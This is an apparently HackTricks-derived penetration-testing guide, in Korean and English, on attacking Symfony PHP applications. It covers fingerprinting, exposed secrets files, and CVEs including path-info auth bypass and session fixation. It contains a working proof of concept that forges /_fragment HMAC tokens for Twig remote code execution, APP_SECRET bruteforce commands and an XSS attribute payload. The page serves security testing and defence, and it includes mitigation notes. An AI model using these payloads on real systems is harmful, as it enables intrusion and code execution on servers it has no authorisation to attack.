# Symfony

{{#include ../../banners/hacktricks-training.md}}

Symfony는 가장 널리 사용되는 PHP 프레임워크 중 하나로, 엔터프라이즈, 전자상거래 및 CMS 대상 평가에서 자주 등장합니다 (Drupal, Shopware, Ibexa, OroCRM … 모두 Symfony 컴포넌트를 포함). 이 페이지는 Symfony 애플리케이션을 발견했을 때 체크리스트에 넣어야 할 공격 팁, 흔한 잘못된 설정 및 최근 취약점을 정리합니다.

> Historical note: A large part of the ecosystem still runs the **5.4 LTS** branch (EOL **November 2025**).  Symfony **7.4** became the new LTS in **Nov 2025** and will receive security fixes until **Nov 2029**.  Always verify the exact patch-level because many 2024‑2026 advisories were fixed only in micro releases.

---

## Recon & Enumeration

### Finger-printing
* HTTP response headers: `X-Powered-By: Symfony`, `X-Debug-Token`, `X-Debug-Token-Link` or cookies starting with `sf_redirect`, `sf_session`, `MOCKSESSID`.
* Source code leaks (`composer.json`, `composer.lock`, `/vendor/…`) 종종 정확한 버전을 드러냅니다:
```bash
curl -s https://target/vendor/composer/installed.json | jq '.[] | select(.name|test("symfony/")) | .name,.version'
```
* Public routes that only exist on Symfony:
* `/_profiler`   (Symfony **Profiler** & debug toolbar)
* `/_wdt/<token>` (“Web Debug Toolbar”)
* `/_error/{code}.{_format}` (pretty error pages)
* `/app_dev.php`, `/config.php`, `/config_dev.php` (pre-4.0 dev front-controllers)
* Wappalyzer, BuiltWith or ffuf/feroxbuster wordlists: `symfony.txt` → look for `/_fragment`, `/_profiler`, `.env`, `.htaccess`.

### Interesting files & endpoints
| Path | Why it matters |
|------|----------------|
| `/.env`, `/.env.local`, `/.env.prod` | 자주 잘못 배포되어 → leaks `APP_SECRET`, DB creds, SMTP, AWS keys |
| `/.git`, `.svn`, `.hg` | 소스 노출 → credentials + business logic |
| `/var/log/*.log`, `/log/dev.log` | Web-root 잘못 설정 시 stack-traces 노출 |
| `/_profiler` | 전체 요청 이력, 구성, 서비스 컨테이너, **APP_SECRET** (≤ 3.4) |
| `/_fragment` | ESI/HInclude에서 사용하는 진입점. `APP_SECRET`을 알면 악용 가능 |
| `/vendor/phpunit/phpunit/phpunit` | 접근 가능하면 PHPUnit RCE (CVE-2017-9841) |
| `/index.php/_error/{code}` | 지문 식별(finger-print) 및 경우에 따라 예외 트레이스가 leak |

---

## High-impact Vulnerabilities

### 1. APP_SECRET disclosure ➜ RCE via `/_fragment` (aka “secret-fragment”)
* **CVE-2019-18889** originally, but *still* appears on modern targets when debug is left enabled or `.env` is exposed.
* Once you know the 32-char `APP_SECRET`, craft an HMAC token and abuse the internal `render()` controller to execute arbitrary Twig:
```python
# PoC – requires the secret
import hmac, hashlib, requests, urllib.parse as u
secret = bytes.fromhex('deadbeef…')
payload = "{{['id']|filter('system')}}"   # RCE in Twig
query = {
'template': '@app/404.html.twig',
'filter': 'raw',
'_format': 'html',
'_locale': 'en',
'globals[cmd]': 'id'
}
qs = u.urlencode(query, doseq=True)
token = hmac.new(secret, qs.encode(), hashlib.sha256).hexdigest()
r = requests.get(f"https://target/_fragment?{qs}&_token={token}")
print(r.text)
```
* 우수한 분석 및 익스플로잇 스크립트: Ambionics blog (References에 링크됨).

### 2. PATH_INFO auth bypass – **CVE-2025-64500** (HttpFoundation)
* 5.4.50 미만, 6.4.29 미만, 7.3.7 미만에 영향. 경로 정규화가 선행 `/`를 제거하여 `/admin` 등 접근 제어 규칙을 우회할 수 있음.
* 빠른 테스트: `curl -H 'PATH_INFO: admin/secret' https://target/index.php` → 인증 없이 admin 경로에 접근된다면 취약함.
* `symfony/http-foundation` 또는 프레임워크 전체를 패치된 패치 레벨로 업그레이드하여 해결.

### 3. MSYS2/Git-Bash argument mangling – **CVE-2026-24739** (Process)
* MSYS2 (Git-Bash, mingw)에서 PHP가 실행될 때 Windows에서 5.4.51 미만, 6.4.33 미만, 7.3.11 미만, 7.4.5 미만, 8.0.5 미만에 영향. `Process`가 `=`를 적절히 인용하지 못해 경로가 손상되고, `rmdir`, `del` 같은 파괴적 명령이 의도치 않은 디렉토리를 대상으로 할 수 있음.
* PHP 스크립트 업로드나 Composer/CLI 헬퍼를 제어할 수 있다면 `=`를 포함한 인자를 (예: `E:/=tmp/delete`) 만들어 경로 재작성 유발 가능.

### 4. Runtime env/argv injection – **CVE-2024-50340** (Runtime)
* `register_argv_argc=On`이고 non‑SAPI 런타임을 사용할 때, 조작된 쿼리 스트링이 `argv` 파싱을 통해 `APP_ENV`/`APP_DEBUG`를 뒤바꿀 수 있음. 5.4.46/6.4.14/7.1.7에서 패치됨.
* 로그에서 `/?--env=prod` 같은 항목이 수용되는지 확인.

### 5. URL validation / open redirect – **CVE-2024-50345** (HttpFoundation)
* URI 내 특수 문자가 브라우저가 검증하는 방식과 다르게 처리되어 공격자 제어 도메인으로 리다이렉트하는 것이 가능했음. 5.4.46/6.4.14/7.1.7에서 수정됨.

### 6. Symfony UX attribute injection – **CVE-2025-47946**
* `symfony/ux-twig-component` & `symfony/ux-live-component` **2.25.1** 이전 버전은 `{{ attributes }}`를 escape 없이 렌더링하여 attribute injection/XSS가 가능. 앱이 컴포넌트 속성을 사용자 정의로 허용(예: 관리자 CMS, 이메일 템플릿)하면 스크립트 주입으로 연결될 수 있음.
* 두 패키지를 2.25.1+로 업데이트. 수동 익스플로잇으로는 커스텀 컴포넌트에 전달되는 속성값에 JS를 넣고 렌더링을 트리거하면 됨.

### 7. Windows Process Hijack – **CVE-2024-51736** (Process)
* Windows에서 `Process` 컴포넌트가 `PATH`보다 현재 작업 디렉토리를 먼저 검색함. 웹루트에 `tar.exe`, `cmd.exe` 등을 업로드할 수 있고 `Process`를 트리거하면(예: 파일 추출, PDF 생성) 명령 실행 권한을 얻을 수 있음.
* 5.4.50, 6.4.14, 7.1.7에서 패치됨.

### 8. Session-Fixation – **CVE-2023-46733**
* Authentication guard가 로그인 후 기존 세션 ID를 재사용함. 공격자가 피해자가 인증하기 전에 쿠키를 설정하면 로그인 후 계정을 탈취할 수 있음.

### 9. Twig sandbox XSS – **CVE-2023-46734**
* 사용자 제어 템플릿(관리자 CMS, 이메일 빌더 등)을 노출하는 애플리케이션에서 `nl2br` 필터가 sandbox를 우회하여 JS 주입에 악용될 수 있음.

### 10. Symfony 1 gadget chains (still found in legacy apps)
* `phpggc symfony/1 system id`는 `sfNamespacedParameterHolder` 같은 클래스에서 unserialize()가 발생할 때 RCE를 트리거하는 Phar 페이로드를 생성. 파일 업로드 엔드포인트와 `phar://` 래퍼를 확인.

{{#ref}}
../../pentesting-web/deserialization/php-deserialization-+-autoload-classes.md
{{#endref}}

---

## Exploitation Cheat-Sheet

### Calculate HMAC token for `/_fragment`
```bash
python - <<'PY'
import sys, hmac, hashlib, urllib.parse as u
secret = bytes.fromhex(sys.argv[1])
qs     = u.quote_plus(sys.argv[2], safe='=&')
print(hmac.new(secret, qs.encode(), hashlib.sha256).hexdigest())
PY deadbeef… "template=@App/evil&filter=raw&_format=html"
```
### Bruteforce 약한 `APP_SECRET`
```bash
cewl -d3 https://target -w words.txt
symfony-secret-bruteforce.py -w words.txt -c abcdef1234567890 https://target
```
### RCE — 노출된 Symfony Console을 통해
만약 `bin/console`이 `php-fpm`을 통해 또는 직접적인 CLI 업로드로 접근 가능하다면:
```bash
php bin/console about        # confirm it works
php bin/console cache:clear --no-warmup
```
캐시 디렉터리 안에 deserialization gadgets를 사용하거나 다음 요청에서 실행될 악성 Twig template을 작성하세요.

### PATH_INFO 우회 취약점을 빠르게 탐지 (CVE-2025-64500)
```bash
curl -i -H 'PATH_INFO: admin/secret' https://target/index.php
# If it returns protected content without redirect/auth, the Request normalization is vulnerable.
```
### Spray UX attribute injection (CVE-2025-47946)
```twig
{# attacker-controlled attribute value #}
<live:button {{ attributes|merge({'onclick':'alert(1)'}) }} />
```
렌더된 출력이 해당 속성을 이스케이프하지 않고 그대로 반영하면 XSS가 발생합니다. 2.25.1+로 패치하세요.

---

## Defensive notes
1. **Never deploy debug** (`APP_ENV=dev`, `APP_DEBUG=1`) 를 프로덕션에 배포하지 마세요; 웹 서버 설정에서 `/app_dev.php`, `/_profiler`, `/_wdt` 를 차단하세요.
2. 비밀은 환경 변수(env vars) 또는 `vault/secrets.local.php` 에 저장하고, *절대* document-root를 통해 접근 가능한 파일에 두지 마세요.
3. 패치 관리를 철저히 하세요 – Symfony 보안 공지에 구독하고 적어도 LTS 패치 레벨을 유지하세요 (5.4.x 는 2025년 11월까지, 6.4 는 2027년 11월까지, 7.4 는 2029년 11월까지).
4. Windows에서 운영 중이라면 CVE-2024-51736 & CVE-2026-24739 를 완화하기 위해 즉시 업그레이드하거나 `open_basedir`/`disable_functions` 를 통한 defence-in-depth 를 추가하세요.

---

### Useful offensive tooling
* **ambionics/symfony-exploits** – secret-fragment RCE, 디버거 라우트 탐지.
* **phpggc** – Symfony 1 & 2용 ready-made gadget chains.
* **sf-encoder** – `_fragment` HMAC 을 계산하는 작은 도구 (Go implementation).



## References
* [Ambionics – Symfony “secret-fragment” Remote Code Execution](https://www.ambionics.io/blog/symfony-secret-fragment)
* [Symfony Security Advisory – CVE-2024-51736: Command Execution Hijack on Windows Process Component](https://symfony.com/blog/cve-2024-51736-command-execution-hijack-on-windows-with-process-class)
* [Symfony Blog – CVE-2025-47946: Unsanitized HTML attribute injection in UX components](https://symfony.com/blog/symfony-ux-cve-2025-47946-unsanitized-html-attribute-injection-via-componentattributes)
* [Symfony Blog – CVE-2026-24739: Incorrect argument escaping under MSYS2/Git Bash](https://symfony.com/blog/cve-2026-24739-incorrect-argument-escaping-under-msys2-git-bash-on-windows-can-lead-to-destructive-file-operations)
{{#include ../../banners/hacktricks-training.md}}
